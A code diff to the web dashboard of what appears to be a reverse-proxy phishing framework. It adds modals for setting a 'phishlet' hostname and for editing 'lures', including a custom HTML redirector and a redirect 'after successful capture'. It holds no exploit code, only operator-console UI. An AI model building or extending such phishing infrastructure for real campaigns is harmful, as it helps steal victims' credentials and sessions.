@@ -862,7 +862,12 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             color: var(--text-secondary);
         }
 
-        .loading::before {
+        .loading {
+            display: inline-block;
+            color: var(--text-secondary);
+        }
+
+        .loading.with-spinner::before {
             content: '';
             display: inline-block;
             width: 20px;
@@ -1845,12 +1850,75 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                     <label for="lureRedirectUrl">Redirect URL (optional):</label>
                     <input type="url" id="lureRedirectUrl" placeholder="https://example.com">
                 </div>
+                <div class="form-group">
+                    <label for="lureRedirector">HTML Redirector (optional):</label>
+                    <input type="text" id="lureRedirector" placeholder="custom-redirect">
+                    <small>Custom HTML redirector directory name</small>
+                </div>
                 <div style="display: flex; gap: 12px; justify-content: center; margin-top: 24px;">
                     <button type="submit" class="btn btn-primary">Create Lure</button>
                     <button type="button" class="btn btn-secondary" onclick="closeModal('createLureModal')">Cancel</button>
                 </div>
             </form>
             <div id="createLureError" class="error hidden"></div>
+        </div>
+    </div>
+
+    <!-- Set Hostname Modal -->
+    <div id="setHostnameModal" class="modal">
+        <div class="modal-content">
+            <h2>🌐 Set Phishlet Hostname</h2>
+            <p>Configure the hostname for this phishlet.</p>
+            <form id="setHostnameForm">
+                <div class="form-group">
+                    <label for="phishletName">Phishlet:</label>
+                    <input type="text" id="phishletName" readonly style="background: var(--bg-secondary); color: var(--text-secondary);">
+                </div>
+                <div class="form-group">
+                    <label for="hostnameInput">Hostname:</label>
+                    <input type="text" id="hostnameInput" placeholder="Enter hostname" required>
+                    <small>Example: login.example.com</small>
+                </div>
+                <div style="display: flex; gap: 12px; justify-content: center; margin-top: 24px;">
+                    <button type="submit" class="btn btn-primary">Set Hostname</button>
+                    <button type="button" class="btn btn-secondary" onclick="closeModal('setHostnameModal')">Cancel</button>
+                </div>
+            </form>
+            <div id="setHostnameError" class="error hidden"></div>
+        </div>
+    </div>
+
+    <!-- Edit Lure Modal -->
+    <div id="editLureModal" class="modal">
+        <div class="modal-content">
+            <h2>✏️ Edit Lure Settings</h2>
+            <p>Modify the settings for this lure.</p>
+            <form id="editLureForm">
+                <div class="form-group">
+                    <label for="editLureId">Lure ID:</label>
+                    <input type="text" id="editLureId" readonly style="background: var(--bg-secondary); color: var(--text-secondary);">
+                </div>
+                <div class="form-group">
+                    <label for="editLureHostname">Hostname (optional):</label>
+                    <input type="text" id="editLureHostname" placeholder="Leave empty for default">
+                    <small>Custom hostname for this lure</small>
+                </div>
+                <div class="form-group">
+                    <label for="editLureRedirectUrl">Redirect URL (optional):</label>
+                    <input type="url" id="editLureRedirectUrl" placeholder="https://example.com">
+                    <small>Where to redirect after successful capture</small>
+                </div>
+                <div class="form-group">
+                    <label for="editLureRedirector">HTML Redirector (optional):</label>
+                    <input type="text" id="editLureRedirector" placeholder="custom-redirect">
+                    <small>Custom HTML redirector directory name</small>
+                </div>
+                <div style="display: flex; gap: 12px; justify-content: center; margin-top: 24px;">
+                    <button type="submit" class="btn btn-primary">Update Lure</button>
+                    <button type="button" class="btn btn-secondary" onclick="closeModal('editLureModal')">Cancel</button>
+                </div>
+            </form>
+            <div id="editLureError" class="error hidden"></div>
         </div>
     </div>
 
@@ -2400,13 +2468,14 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                 const phishlet = document.getElementById('lurePhishlet').value.trim();
                 const hostname = document.getElementById('lureHostname').value.trim();
                 const redirectUrl = document.getElementById('lureRedirectUrl').value.trim();
+                const redirector = document.getElementById('lureRedirector').value.trim();
                 
                 if (!phishlet) {
                     showCreateLureError('Phishlet name is required');
                     return;
                 }
                 
-                createLure(phishlet, hostname, redirectUrl);
+                createLure(phishlet, hostname, redirectUrl, redirector);
             });
 
             document.getElementById('telegramConfigForm').addEventListener('submit', function(e) {
@@ -2437,6 +2506,34 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                 }
                 
                 uploadRedirector(name, fileInput.files[0]);
+            });
+
+            // Set Hostname Modal Form Handler
+            document.getElementById('setHostnameForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const phishletName = document.getElementById('phishletName').value;
+                const hostname = document.getElementById('hostnameInput').value.trim();
+                
+                if (!hostname) {
+                    document.getElementById('setHostnameError').textContent = 'Please enter a hostname';
+                    document.getElementById('setHostnameError').classList.remove('hidden');
+                    return;
+                }
+                
+                dashboard.doSetPhishletHostname(phishletName, hostname);
+                closeModal('setHostnameModal');
+            });
+
+            // Edit Lure Modal Form Handler
+            document.getElementById('editLureForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const lureId = document.getElementById('editLureId').value;
+                const hostname = document.getElementById('editLureHostname').value.trim();
+                const redirectUrl = document.getElementById('editLureRedirectUrl').value.trim();
+                const redirector = document.getElementById('editLureRedirector').value.trim();
+                
+                doEditLure(lureId, hostname, redirectUrl, redirector);
+                closeModal('editLureModal');
             });
         });
 
@@ -2920,20 +3017,13 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             }
 
             async setPhishletHostname(phishletName) {
-                showModal('Set Hostname', 'Set hostname for ' + phishletName + ':', [
-                    {
-                        text: 'Set Hostname',
-                        class: 'btn-primary',
-                        onclick: () => {
-                            closeModal('messageModal');
-                            const hostname = prompt('Enter hostname:', '');
-                            if (hostname !== null) {
-                                this.doSetPhishletHostname(phishletName, hostname);
-                            }
-                        }
-                    },
-                    { text: 'Cancel', class: 'btn-secondary' }
-                ]);
+                // Populate the modal with phishlet name
+                document.getElementById('phishletName').value = phishletName;
+                document.getElementById('hostnameInput').value = '';
+                document.getElementById('setHostnameError').classList.add('hidden');
+                
+                // Show the modal
+                document.getElementById('setHostnameModal').style.display = 'flex';
             }
 
             async doSetPhishletHostname(phishletName, hostname) {
@@ -3176,7 +3266,7 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             errorEl.classList.remove('hidden');
         }
 
-        async function createLure(phishletName, hostname = '', redirectUrl = '') {
+        async function createLure(phishletName, hostname = '', redirectUrl = '', redirector = '') {
             try {
                 const lureData = { phishlet: phishletName };
                 if (hostname && hostname.trim()) {
@@ -3184,6 +3274,9 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                 }
                 if (redirectUrl && redirectUrl.trim()) {
                     lureData.redirect_url = redirectUrl.trim();
+                }
+                if (redirector && redirector.trim()) {
+                    lureData.redirector = redirector.trim();
                 }
 
                 const response = await fetch('/api/lures', {
@@ -3235,27 +3328,19 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             }
         }
 
-        async function editLure(lureId) {
-            showModal('Edit Lure', 'Modify the lure settings:', [
-                {
-                    text: 'Edit Settings',
-                    class: 'btn-primary',
-                    onclick: () => {
-                        closeModal('messageModal');
-                        const hostname = prompt('Enter new hostname (leave empty for default):');
-                        if (hostname !== null) {
-                            const redirectUrl = prompt('Enter redirect URL (leave empty for none):');
-                            if (redirectUrl !== null) {
-                                doEditLure(lureId, hostname, redirectUrl);
-                            }
-                        }
-                    }
-                },
-                { text: 'Cancel', class: 'btn-secondary' }
-            ]);
+        function editLure(lureId) {
+            // Populate the modal with lure ID
+            document.getElementById('editLureId').value = lureId;
+            document.getElementById('editLureHostname').value = '';
+            document.getElementById('editLureRedirectUrl').value = '';
+            document.getElementById('editLureRedirector').value = '';
+            document.getElementById('editLureError').classList.add('hidden');
+            
+            // Show the modal
+            document.getElementById('editLureModal').style.display = 'flex';
         }
 
-        async function doEditLure(lureId, hostname, redirectUrl) {
+        async function doEditLure(lureId, hostname, redirectUrl, redirector) {
             try {
                 const response = await fetch('/api/lures/' + lureId, {
                     method: 'PUT',
@@ -3265,7 +3350,8 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                     },
                     body: JSON.stringify({ 
                         hostname: hostname || '',
-                        redirect_url: redirectUrl || ''
+                        redirect_url: redirectUrl || '',
+                        redirector: redirector || ''
                     })
                 });
                 const data = await response.json();
